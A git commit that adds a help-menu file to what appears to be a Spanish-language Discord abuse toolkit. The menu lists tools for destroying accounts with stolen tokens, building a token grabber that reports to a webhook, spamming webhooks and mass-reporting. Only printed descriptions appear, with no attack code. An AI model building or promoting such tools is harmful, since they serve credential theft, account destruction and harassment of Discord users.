7af209ed02e9de532d0ac7b84ec8126deb7b3e5d
zEncrypte <72712659+zEncrypte@users.noreply.github.com>
2022-04-13 16:22:47 -0500

    Create commands.py

---
+++ modules/commands.py
@@ -0,0 +1,15 @@
+from colorama import Fore, Style
+def ayuda():
+    print(Fore.RED + Style.BRIGHT + f"\n [+] TokenRaper: Destruye una cuenta por completo.")
+    print(f"\n [+] WebhookSpammer: Spamea un webhook especificado.")
+    print(f"\n [+] TokenChecker: Saca la información de una cuenta + verifica si el token es válido.")
+    print(f"\n [+] WebhookChecker: Revisa la información de un webhook + verifica si el webhook es válido.")
+    print(f"\n [+] HistoryClear: Elimina tu historial de mensajes en un canal especificado")
+    print(f"\n [+] AutoBump: Envia el comando !d bump cada 2 horas en un canal especificado.")
+    print(f"\n [+] TokenGrabber: Crea un token grabber con la webhook especificado.")
+    print(f"\n [+] ServerLookup: Revisa la información de un servidor en el que esta el usuario.")
+    print(f"\n [+] MassReport: Realiza un reporte masivo")
+
+
+def show_help():
+    pass
